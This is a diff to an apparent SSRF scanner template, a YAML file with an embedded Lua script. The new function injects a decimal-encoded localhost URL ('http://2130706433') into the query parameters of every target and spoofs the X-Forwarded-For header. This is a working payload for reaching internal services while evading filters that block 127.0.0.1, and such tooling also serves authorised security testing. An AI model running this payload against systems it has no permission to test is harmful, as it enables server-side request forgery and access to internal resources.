@@ -19,26 +19,45 @@ match:
   allowed_methods: [GET, POST]
   required_tags: [Redirect, Callback, Webhook]
   require_params: true
-
+  
 script:
   language: lua
-  entry: bypass
+  entry: run_batch
   source: |
-    function bypass(ctx)
-        local payload_vector = "2130706433" 
-        local path = ctx.path or "/"
-        if path:sub(1,1) ~= "/" then path = "/" .. path end
-        local final_url = (ctx.scheme or "http") .. "://" .. ctx.hostname .. (ctx.port and ctx.port ~= "" and ":" .. tostring(ctx.port) or "") .. path
+    function run_batch(targets)
+        local results = {}
+        local payload_vector = "http://2130706433" -- 127.0.0.1 in Decimal
         
-        local custom_headers = {}
-        custom_headers["X-Forwarded-For"] = payload_vector
-        custom_headers["Referer"] = ctx.target
+        for _, target in ipairs(targets) do
+            local base_url = target.url
+            
+            -- به ازای هر پارامتر، پی‌لود تزریق می‌شود
+            for _, param in ipairs(target.params) do
+                local new_url = base_url
+                
+                -- جایگزینی ساده در Query String (قابل توسعه بر اساس location)
+                if param.location == "Query" then
+                    local pattern = param.name .. "=[^&]*"
+                    local replacement = param.name .. "=" .. payload_vector
+                    if new_url:find(pattern) then
+                        new_url = new_url:gsub(pattern, replacement)
+                    else
+                        local sep = new_url:find("%?") and "&" or "?"
+                        new_url = new_url .. sep .. replacement
+                    end
+                end
 
-        return {
-            url = final_url,
-            method = "GET",
-            headers = custom_headers,
-            body = "",
-            action = "scan"
-        }
+                table.insert(results, {
+                    url = new_url,
+                    method = target.method or "GET",
+                    headers = {
+                        ["X-Forwarded-For"] = "2130706433",
+                        -- ["User-Agent"] = "SSRFdevil-Engine/2.0"
+                    },
+                    -- body = "",
+                    -- action = "scan"
+                })
+            end
+        end
+        return results
     end
